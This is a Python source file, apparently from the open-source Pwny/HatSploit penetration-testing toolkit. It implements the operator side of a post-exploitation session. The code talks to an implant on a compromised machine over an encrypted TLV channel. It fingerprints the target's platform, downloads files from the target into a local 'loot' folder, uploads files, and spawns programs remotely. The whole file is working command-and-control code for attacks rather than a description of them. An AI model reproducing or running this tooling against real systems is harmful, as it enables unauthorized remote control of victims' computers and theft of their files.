"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import socket
import pathlib

from alive_progress import alive_bar

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding

from typing import Optional

from pwny.types import *
from pwny.api import *

from pwny.tlv import TLV
from pwny.pipes import Pipes
from pwny.spawn import Spawn
from pwny.console import Console

from pex.fs import FS
from pex.ssl import OpenSSL
from pex.proto.tlv import TLVClient, TLVPacket

from hatsploit.lib.core.session import Session
from hatsploit.lib.loot import Loot


class PwnySession(Session, FS, OpenSSL):
    """ Subclass of pwny module.

    This subclass of pwny module represents an implementation
    of the Pwny session for HatSploit Framework.
    """

    def __init__(self) -> None:
        super().__init__({
            'Type': "pwny"
        })

        self.pwny = f'{os.path.dirname(os.path.dirname(__file__))}/pwny/'

        self.pwny_data = self.pwny + 'data/'
        self.pwny_tabs = self.pwny + 'tabs/'
        self.pwny_loot = f'{pathlib.Path.home()}/.pwny/'

        self.pwny_plugins = self.pwny + 'plugins/'
        self.pwny_commands = self.pwny + 'commands/'

        self.templates = self.pwny + 'templates/'

        self.channel = None
        self.uuid = None
        self.terminated = False
        self.reason = TERM_UNKNOWN

        self.pipes = Pipes(self)
        self.console = None

        self.loot = Loot(self.pwny_loot)

    def open(self, client: socket.socket) -> None:
        """ Open the Pwny session.

        :param socket.socket client: client to open session with
        :return None: None
        :raises RuntimeError: with trailing error message
        """

        self.channel = TLV(
            TLVClient(client),
            args=[
                True,
            ]
        )
        self.channel.queue_resume()

        tlv = self.send_command(BUILTIN_UUID)
        self.uuid = tlv.get_string(TLV_TYPE_UUID)

        if not self.uuid:
            raise RuntimeError("No UUID received or UUID broken!")

        self.loot.create_loot()

        if not self.info['Platform'] and not self.info['Arch']:
            self.identify()

        self.console = Console(self)
        self.console.start_pwny()

    def identify(self) -> None:
        """ Enforce platform and architecture identification
        by calling partially completed sysinfo.

        :return None: None
        """

        result = self.send_command(
            tag=BUILTIN_SYSINFO
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            raise RuntimeError("Failed to identify target system!")

        platform = result.get_string(BUILTIN_TYPE_PLATFORM)
        arch = result.get_string(BUILTIN_TYPE_ARCH)

        if platform.lower() == 'ios':
            platform = 'apple_ios'

        self.info.update({
            'Platform': platform,
            'Arch': arch
        })

    def secure(self) -> bool:
        """ Establish secure TLS communication.

        :return bool: True if success else False
        """

        if self.channel.secure:
            self.print_process("Initializing re-exchange of keys...")

        self.print_process("Generating RSA keys...")
        key = self.generate_key()

        priv_key = self.dump_key(key)
        pub_key = self.dump_public_key(key)

        self.print_process("Exchanging RSA keys for TLS...")

        result = self.send_command(
            tag=BUILTIN_SECURE,
            args={
                BUILTIN_TYPE_PUBLIC_KEY: pub_key,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to exchange keys!")
            return False

        self.print_success("RSA keys exchange success!")
        sym_key = result.get_raw(BUILTIN_TYPE_KEY)

        if not sym_key:
            self.print_error("Symmetric key was not received!")
            return False

        context = serialization.load_pem_private_key(
            priv_key,
            password=None,
        )
        sym_key_plain = context.decrypt(
            sym_key,
            padding.PKCS1v15()
        )

        self.print_success("Communication secured with TLS!")
        self.channel.secure = True
        self.channel.key = sym_key_plain

        return True

    def close(self) -> None:
        """ Close the Pwny session.

        :return None: None
        """

        self.channel.client.close()
        self.reason = TERM_CLOSED
        self.terminated = True

    def heartbeat(self) -> bool:
        """ Check the Pwny session heartbeat.

        :return bool: True if the Pwny session is alive
        """

        return not self.terminated

    def send_command(self, tag: int, args: dict = {}, plugin: Optional[int] = None) -> TLVPacket:
        """ Send command to the Pwny session.

        :param int tag: tag
        :param dict args: command arguments with their types
        :param Optional[int] plugin: plugin ID if tag is presented within the plugin
        :return TLVPacket: packets
        """

        if self.console:
            verbose = self.console.get_env('VERBOSE')
        else:
            verbose = False

        tlv = TLVPacket()

        if plugin is not None:
            tlv.add_int(TLV_TYPE_TAB_ID, plugin)

        tlv.add_int(TLV_TYPE_TAG, tag)
        tlv.add_from_dict(args)

        try:
            self.channel.send(tlv, verbose=verbose)

        except Exception as e:
            self.terminated = True
            self.reason = str(e)

            raise RuntimeWarning(f"Connection terminated ({self.reason}).")

        query = {
            TLV_TYPE_TAG: tag
        }

        if PIPE_TYPE_ID in args and PIPE_TYPE_TYPE in args:
            query.update({
                PIPE_TYPE_TYPE: args[PIPE_TYPE_TYPE],
                PIPE_TYPE_ID: args[PIPE_TYPE_ID],
            })

        if plugin is not None:
            query.update({
                TLV_TYPE_TAB_ID: plugin
            })

        if not self.channel.running:
            while True:
                response = self.channel.read(
                    error=True,
                    verbose=verbose
                )

                if self.channel.tlv_query(response, query):
                    break

                self.channel.queue.append(response)

            return response

        response = self.channel.queue_find(query)

        while not response:
            response = self.channel.queue_find(query)

        return response

    def download(self, remote_file: str, local_path: str) -> bool:
        """ Download file from the Pwny session.

        :param str remote_file: file to download
        :param str local_path: path to save downloaded file to
        :return bool: True if download succeed
        """

        exists, is_dir = self.exists(local_path)

        if not exists:
            self.check_file(local_path)
            return False

        if is_dir:
            local_path = os.path.abspath(
                '/'.join((local_path, os.path.split(remote_file)[1])))

        try:
            pipe_id = self.pipes.create_pipe(
                pipe_type=FS_PIPE_FILE,
                args={
                    TLV_TYPE_FILENAME: remote_file,
                    FS_TYPE_MODE: 'rb',
                }
            )

        except RuntimeError:
            self.print_error(f"Remote file: {remote_file}: does not exist!")
            return False

        self.pipes.seek_pipe(FS_PIPE_FILE, pipe_id, 0, 2)
        size = self.pipes.tell_pipe(FS_PIPE_FILE, pipe_id)
        self.pipes.seek_pipe(FS_PIPE_FILE, pipe_id, 0, 0)

        self.interrupt()
        with open(local_path, 'wb') as f:
            with alive_bar(int(size / TLV_FILE_CHUNK) + 1, receipt=False,
                           ctrl_c=False, monitor="{percent:.0%}", stats=False,
                           title=os.path.split(remote_file)[1]) as bar:
                while size > 0:
                    bar()

                    chunk = min(TLV_FILE_CHUNK, size)
                    buffer = self.pipes.read_pipe(FS_PIPE_FILE, pipe_id, chunk)
                    f.write(buffer)
                    size -= chunk

        self.pipes.destroy_pipe(FS_PIPE_FILE, pipe_id)
        self.resume()
        return True

    def upload(self, local_file: str, remote_path: str) -> bool:
        """ Upload file to the Pwny session.

        :param str local_file: file to upload
        :param str remote_path: path to save uploaded file to
        :return bool: True if upload succeed
        """

        self.check_file(local_file)

        with open(local_file, 'rb') as f:
            buffer = f.read()
            size = len(buffer)

            pipe_id = self.pipes.create_pipe(
                pipe_type=FS_PIPE_FILE,
                args={
                    TLV_TYPE_FILENAME: remote_path,
                    FS_TYPE_MODE: 'wb',
                }
            )

            self.interrupt()
            with alive_bar(int(size / TLV_FILE_CHUNK) + 1, receipt=False,
                           ctrl_c=False, monitor="{percent:.0%}", stats=False,
                           title=os.path.split(local_file)[1]) as bar:
                for step in range(0, size, TLV_FILE_CHUNK):
                    bar()

                    chunk = buffer[step:step + TLV_FILE_CHUNK]
                    self.pipes.write_pipe(FS_PIPE_FILE, pipe_id, chunk)

            self.pipes.destroy_pipe(FS_PIPE_FILE, pipe_id)
            self.resume()
            return True

    def spawn(self, path: str, args: list = [], search: list = []) -> bool:
        """ Execute path.

        :param str path: path to execute
        :param list args: command-line arguments
        :param list search: list of paths to search for binary in
        :return bool: True if success else False
        """

        spawn = Spawn(self)

        if not os.path.isabs(path):
            for search_path in search:
                search_path = spawn.search_path(search_path, path)

                if search_path:
                    path = search_path
                    break

        return spawn.spawn(path, args)

    def interrupt(self) -> None:
        """ Interrupt all session events.

        :return None: None
        """

        self.channel.queue_interrupt()

    def resume(self) -> None:
        """ Resume all session events.

        :return None: None
        """

        self.channel.queue_resume()

    def interact(self) -> None:
        """ Interact with the Pwny session.

        :return None: None
        :raises RuntimeError: with trailing error message
        """

        if not self.console:
            raise RuntimeError("Not yet ready for interaction!")

        self.console.pwny_console()
